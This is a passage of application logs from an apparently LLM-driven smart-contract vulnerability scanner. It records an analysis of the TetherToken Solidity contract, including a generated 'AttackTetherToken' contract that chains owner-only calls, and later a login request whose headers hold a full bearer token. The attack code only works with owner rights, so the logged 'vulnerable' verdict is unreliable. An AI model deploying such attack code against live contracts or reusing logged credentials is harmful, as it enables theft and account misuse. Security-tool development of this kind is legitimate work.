}\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'raw_response': '1. Contract Analysis:  \nThe main contract with business logic and user funds is **TetherToken**, an ERC20 token implementation with additional features: pausable functionality, blacklist management, upgradeability, and token issuance/redemption controlled by the owner. It inherits from `Pausable`, `StandardToken`, and `BlackList`. The contract holds token balances (not ETH) and manages token transfers with optional fees. It also supports deprecation and upgrade to a new contract address.\n\nKey features and components:  \n- **Ownable**: Owner control over critical functions.  \n- **Pausable**: Owner can pause/unpause token transfers.  \n- **BlackList**: Owner can blacklist addresses, preventing them from transferring tokens and can destroy blacklisted funds.  \n- **Upgradeability**: The contract can be deprecated in favor of an upgraded contract address, forwarding calls to it.  \n- **Fee mechanism**: basisPointsRate and maximumFee allow charging fees on transfers, credited to the owner.  \n- **Issue/Redeem**: Owner can mint new tokens or burn tokens from their balance.\n\nSolidity version: **pragma solidity ^0.4.17**\n\n---\n\n2. Vulnerability Assessment:\n\n**A. Centralization and Owner Privileges (High Risk)**  \n- The owner has extensive powers:  \n  - Can pause/unpause all token transfers.  \n  - Can blacklist any address arbitrarily, freezing their tokens.  \n  - Can destroy blacklisted users‚Äô tokens, reducing total supply.  \n  - Can issue (mint) unlimited tokens to self, inflating supply arbitrarily.  \n  - Can redeem (burn) tokens from own balance.  \n  - Can deprecate the contract and redirect all token operations to an upgraded contract.  \n- Impact: Owner can censor users, confiscate tokens, inflate supply, or replace contract logic at will. This centralization risk is critical for trust and security.\n\n**B. Blacklist and Destroy Black Funds Logic**  \n- `destroyBlackFunds` zeroes out blacklisted user‚Äôs balance and reduces total supply accordingly.  \n- This function can be abused by owner to confiscate tokens from any blacklisted user without their consent.  \n- No user consent or appeal mechanism.\n\n**C. Upgradeability Risks**  \n- The owner can set an upgraded contract address and mark the current contract as deprecated.  \n- After deprecation, all token operations forward to the upgraded contract.  \n- If the upgraded contract is malicious or buggy, users lose control of their tokens.  \n- No multisig or timelock on upgrade.\n\n**D. Fee Parameters Setting**  \n- Owner can set `basisPointsRate` and `maximumFee` with limits (`basisPointsRate < 20`, `maximumFee < 50 * 10^decimals`).  \n- While limits exist, owner can still impose fees up to 0.2% and max 50 tokens per transfer (assuming decimals=18).  \n- Fees go to owner, which may be unexpected by users.\n\n**E. ERC20 Approve Race Condition Mitigation**  \n- The `approve` function requires allowance to be zero before setting a new non-zero allowance, mitigating the known ERC20 race condition.  \n- This is good practice.\n\n**F. No Reentrancy or Math Vulnerabilities**  \n- Uses SafeMath for all arithmetic operations.  \n- No external calls in state-changing functions except forwarding to upgraded contract when deprecated.  \n- No payable functions accepting ETH, so no ETH-related vulnerabilities.\n\n**G. Short Address Attack Mitigation**  \n- Uses `onlyPayloadSize` modifier to prevent short address attacks on `transfer`, `transferFrom`, and `approve`.  \n- This is good practice.\n\n---\n\n3. Exploitation Requirements:\n\n- To exploit the centralization risks, an attacker would need to gain control of the **owner** account.  \n- With owner privileges, the attacker can:  \n  - Pause the contract to freeze all transfers.  \n  - Blacklist any user and destroy their tokens.  \n  - Mint unlimited tokens to inflate supply and devalue tokens.  \n  - Deprecate the contract and redirect users to a malicious upgraded contract.  \n- No direct vulnerabilities allow non-owner users to exploit these features.  \n- No reentrancy or arithmetic exploits found.  \n- No backdoors or hidden functions detected.\n\n---\n\n**Summary:**  \nThe contract is a standard, well-implemented ERC20 token with pausable, blacklist, and upgradeability features. It properly uses SafeMath and mitigates known ERC20 issues like short address attack and approve race condition. However, it is highly centralized with the owner having critical powers that can censor users, confiscate tokens, inflate supply, and upgrade to arbitrary contracts. This centralization is the main security and trust concern.\n\n---\n\n**Final notes:**  \n- Solidity version: `pragma solidity ^0.4.17`  \n- No reentrancy, math, or logic bugs detected beyond owner centralization risks.  \n- Owner key compromise or malicious owner actions pose the greatest threat.', 'reasoning': 'The main contract with business logic and user funds is **TetherToken**, an ERC20 token implementation with additional features: pausable functionality, blacklist management, upgradeability, and token issuance/redemption controlled by the owner. It inherits from `Pausable`, `StandardToken`, and `BlackList`. The contract holds token balances (not ETH) and manages token transfers with optional fees. It also supports deprecation and upgrade to a new contract address.\n\nKey features and components:  \n- **Ownable**: Owner control over critical functions.  \n- **Pausable**: Owner can pause/unpause token transfers.  \n- **BlackList**: Owner can blacklist addresses, preventing them from transferring tokens and can destroy blacklisted funds.  \n- **Upgradeability**: The contract can be deprecated in favor of an upgraded contract address, forwarding calls to it.  \n- **Fee mechanism**: basisPointsRate and maximumFee allow charging fees on transfers, credited to the owner.  \n- **Issue/Redeem**: Owner can mint new tokens or burn tokens from their balance.\n\nSolidity version: **pragma solidity ^0.4.17**\n\n---\n\n2.', 'summary': '**A. Centralization and Owner Privileges (High Risk)**  \n- The owner has extensive powers:  \n  - Can pause/unpause all token transfers.  \n  - Can blacklist any address arbitrarily, freezing their tokens.  \n  - Can destroy blacklisted users‚Äô tokens, reducing total supply.  \n  - Can issue (mint) unlimited tokens to self, inflating supply arbitrarily.  \n  - Can redeem (burn) tokens from own balance.  \n  - Can deprecate the contract and redirect all token operations to an upgraded contract.  \n- Impact: Owner can censor users, confiscate tokens, inflate supply, or replace contract logic at will. This centralization risk is critical for trust and security.\n\n**B. Blacklist and Destroy Black Funds Logic**  \n- `destroyBlackFunds` zeroes out blacklisted user‚Äôs balance and reduces total supply accordingly.  \n- This function can be abused by owner to confiscate tokens from any blacklisted user without their consent.  \n- No user consent or appeal mechanism.\n\n**C. Upgradeability Risks**  \n- The owner can set an upgraded contract address and mark the current contract as deprecated.  \n- After deprecation, all token operations forward to the upgraded contract.  \n- If the upgraded contract is malicious or buggy, users lose control of their tokens.  \n- No multisig or timelock on upgrade.\n\n**D. Fee Parameters Setting**  \n- Owner can set `basisPointsRate` and `maximumFee` with limits (`basisPointsRate < 20`, `maximumFee < 50 * 10^decimals`).  \n- While limits exist, owner can still impose fees up to 0.2% and max 50 tokens per transfer (assuming decimals=18).  \n- Fees go to owner, which may be unexpected by users.\n\n**E. ERC20 Approve Race Condition Mitigation**  \n- The `approve` function requires allowance to be zero before setting a new non-zero allowance, mitigating the known ERC20 race condition.  \n- This is good practice.\n\n**F. No Reentrancy or Math Vulnerabilities**  \n- Uses SafeMath for all arithmetic operations.  \n- No external calls in state-changing functions except forwarding to upgraded contract when deprecated.  \n- No payable functions accepting ETH, so no ETH-related vulnerabilities.\n\n**G. Short Address Attack Mitigation**  \n- Uses `onlyPayloadSize` modifier to prevent short address attacks on `transfer`, `transferFrom`, and `approve`.  \n- This is good practice.\n\n---\n\n3.', 'code': 'pragma solidity 0.4.17;\n\ncontract AttackTetherToken {\n    address public owner;\n    address public target;\n\n    function AttackTetherToken(address _target) public {\n        owner = msg.sender;\n        target = _target;\n    }\n\n    function attack(address victim, address upgraded) public {\n        require(msg.sender == owner);\n\n        // Pause the contract\n        target.call(bytes4(keccak256("pause()")));\n\n        // Blacklist victim\n        target.call(bytes4(keccak256("addBlackList(address)")), victim);\n\n        // Destroy victim\'s blacklisted funds\n        target.call(bytes4(keccak256("destroyBlackFunds(address)")), victim);\n\n        // Mint unlimited tokens to attacker\n        target.call(bytes4(keccak256("issue(uint256)")), 1000000000000000000000000000);\n\n        // Deprecate contract to upgraded malicious contract\n        target.call(bytes4(keccak256("deprecate(address)")), upgraded);\n    }\n}', 'code_type': 'solidity', 'duration': 29.17194151878357}
2025-07-05 13:16:22,742 - app.services.contract_service - INFO - Has exploit code: True
2025-07-05 13:16:22,744 - app.services.contract_service - INFO - No vulnerabilities mentioned: False
2025-07-05 13:16:22,745 - app.services.contract_service - INFO - Final vulnerability determination: True
2025-07-05 13:16:22,746 - app.services.contract_service - INFO - Attack strategy summary: **A. Centralization and Owner Privileges (High Risk)**  
- The owner has extensive powers:  
  - Can pause/unpause all token transfers.  
  - Can blacklist any address arbitrarily, freezing their tokens.  
  - Can destroy blacklisted users‚Äô tokens, reducing total supply.  
  - Can issue (mint) unlimited tokens to self, inflating supply arbitrarily.  
  - Can redeem (burn) tokens from own balance.  
  - Can deprecate the contract and redirect all token operations to an upgraded contract.  
- Impact: Owner can censor users, confiscate tokens, inflate supply, or replace contract logic at will. This centralization risk is critical for trust and security.

**B. Blacklist and Destroy Black Funds Logic**  
- `destroyBlackFunds` zeroes out blacklisted user‚Äôs balance and reduces total supply accordingly.  
- This function can be abused by owner to confiscate tokens from any blacklisted user without their consent.  
- No user consent or appeal mechanism.

**C. Upgradeability Risks**  
- The owner can set an upgraded contract address and mark the current contract as deprecated.  
- After deprecation, all token operations forward to the upgraded contract.  
- If the upgraded contract is malicious or buggy, users lose control of their tokens.  
- No multisig or timelock on upgrade.

**D. Fee Parameters Setting**  
- Owner can set `basisPointsRate` and `maximumFee` with limits (`basisPointsRate < 20`, `maximumFee < 50 * 10^decimals`).  
- While limits exist, owner can still impose fees up to 0.2% and max 50 tokens per transfer (assuming decimals=18).  
- Fees go to owner, which may be unexpected by users.

**E. ERC20 Approve Race Condition Mitigation**  
- The `approve` function requires allowance to be zero before setting a new non-zero allowance, mitigating the known ERC20 race condition.  
- This is good practice.

**F. No Reentrancy or Math Vulnerabilities**  
- Uses SafeMath for all arithmetic operations.  
- No external calls in state-changing functions except forwarding to upgraded contract when deprecated.  
- No payable functions accepting ETH, so no ETH-related vulnerabilities.

**G. Short Address Attack Mitigation**  
- Uses `onlyPayloadSize` modifier to prevent short address attacks on `transfer`, `transferFrom`, and `approve`.  
- This is good practice.

---

3.
2025-07-05 13:16:22,748 - app.services.contract_service - INFO - Analysis completed with status: KO
2025-07-05 13:16:22,750 - app.services.contract_service - INFO - Temporary file /tmp/tmpzqyp3b34.sol removed
2025-07-05 13:16:22,782 - app.api.contract - INFO - Report saved with filename: Ownable_2025-07-05_13-16, status: KO
2025-07-05 13:16:22,785 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-07-05 13:16:22,787 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 13:16:22,789 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 13:16:22,790 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 13:16:22,792 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-05 13:16:22,795 - werkzeug - INFO - 192.168.112.1 - - [05/Jul/2025 13:16:22] "POST /analyze HTTP/1.1" 200 -
2025-07-05 13:17:34,463 - flask_cors.extension - DEBUG - Request to ''/analysis/status/2'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 13:17:34,470 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 13:17:34,473 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 13:17:34,477 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-05 13:17:34,481 - flask_cors.extension - DEBUG - CORS have been already evaluated, skipping
2025-07-05 13:17:34,487 - werkzeug - INFO - 192.168.112.1 - - [05/Jul/2025 13:17:34] "[33mOPTIONS /analysis/status/2 HTTP/1.1[0m" 404 -
2025-07-05 13:20:58,573 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-07-05 13:20:58,764 - app.app - INFO - Application started
2025-07-05 13:20:58,776 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://192.168.160.5:8000
2025-07-05 13:20:58,778 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-07-05 13:20:58,925 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 13:20:58,931 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 13:20:58,934 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 13:20:58,936 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-05 13:20:58,940 - werkzeug - INFO - 192.168.160.1 - - [05/Jul/2025 13:20:58] "OPTIONS /login HTTP/1.1" 200 -
2025-07-05 13:20:58,954 - app.api.auth - INFO - Received login request with method: POST
2025-07-05 13:20:58,956 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTE3MjQ3OTF9.2s4z8x2m3CL17p_KAWkPgoiD5zAo6OmNKoGmzP0vwiY', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-07-05 13:20:58,957 - app.api.auth - INFO - Request content type: application/json
2025-07-05 13:20:58,959 - app.api.auth - INFO - Processing JSON request
2025-07-05 13:20:58,961 - app.api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-05 13:20:59,428 - app.api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-05 13:20:59,431 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 13:20:59,433 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 13:20:59,434 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 13:20:59,435 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-05 13:20:59,438 - werkzeug - INFO - 192.168.160.1 - - [05/Jul/2025 13:20:59] "POST /login HTTP/1.1" 200 -
2025-07-05 13:21:19,249 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-05 13:21:19,267 - app.api.contract - INFO - Analyzing code snippet
2025-07-05 13:21:19,286 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-07-05 13:21:19,294 - app.services.contract_service - INFO - Created temporary file for contract code: /tmp/tmp0fiwqf58.sol
2025-07-05 13:21:19,304 - app.services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-07-05 13:21:19,306 - app.services.contract_service - INFO - Compiling contract...
2025-07-05 13:21:19,519 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.8.0+commit.c7dfd78e
2025-07-05 13:21:20,656 - solcx - INFO - Using solc version 0.8.0
2025-07-05 13:21:20,658 - solcx - INFO - solc 0.8.0 successfully installed at: /root/.solcx/solc-v0.8.0
2025-07-05 13:21:20,662 - solcx - INFO - Using solc version 0.8.0
2025-07-05 13:21:21,706 - app.services.contract_service - INFO - Compilation result: 1 contracts compiled
2025-07-05 13:21:21,708 - app.services.contract_service - INFO - Deploying 1 contracts...
2025-07-05 13:21:22,248 - app.services.contract_service - INFO - Contract VulnerableBank deployed at 0x5b1869D9A4C187F2EAa108f3062412ecf0526b24
2025-07-05 13:21:22,250 - app.services.contract_service - INFO - Setting up contract VulnerableBank...
2025-07-05 13:21:22,740 - app.services.contract_service - INFO - Contract VulnerableBank setup completed
2025-07-05 13:21:22,743 - app.services.contract_service - INFO - Funding contract VulnerableBank for attack testing...
2025-07-05 13:21:23,277 - app.services.contract_service - INFO - Contract VulnerableBank funded
2025-07-05 13:21:23,279 - app.services.contract_service - INFO - Building contract observation...
2025-07-05 13:21:23,802 - app.services.contract_service - INFO - Contract observation built successfully
2025-07-05 13:21:23,803 - app.services.contract_service - INFO - Generating attack strategy...
2025-07-05 13:21:23,805 - app.services.contract_service - INFO - Running Slither analysis...
2025-07-05 13:21:23,817 - app.services.contract_service - WARNING - Failed to run Slither analysis: solc-select non trouv√© : installe-le via pip install solc-select
2025-07-05 13:21:23,842 - app.services.contract_service - WARNING - Traceback (most recent call last):
  File "/app/modules/slither_scan.py", line 38, in ensure_solc_version
    subprocess.run(
  File "/usr/local/lib/python3.12/subprocess.py", line 548, in run
    with Popen(*popenargs, **kwargs) as process:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/subprocess.py", line 1026, in __init__
    self._execute_child(args, executable, preexec_fn, close_fds,
  File "/usr/local/lib/python3.12/subprocess.py", line 1955, in _execute_child
    raise child_exception_type(errno_num, err_msg, err_filename)
FileNotFoundError: [Errno 2] No such file or directory: 'solc-select'

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/app/services/contract_service.py", line 192, in analyze_contract_from_code
    slith_result = slither_analyze(temp_path)
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 152, in slither_analyze
    slither_result = run_slither(sol_path, json_path, solc_version)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 69, in run_slither
    ensure_solc_version(solc_version)
  File "/app/modules/slither_scan.py", line 44, in ensure_solc_version
    raise EnvironmentError("solc-select non trouv√© : installe-le via pip install solc-select")
OSError: solc-select non trouv√© : installe-le via pip install solc-select

2025-07-05 13:21:23,843 - app.modules.attack_generator - INFO - Starting complete attack strategy generation
2025-07-05 13:21:23,845 - app.modules.attack_generator - INFO - Contract name: VulnerableBank
2025-07-05 13:21:23,846 - app.modules.attack_generator - INFO - Using step number: 0 for model selection
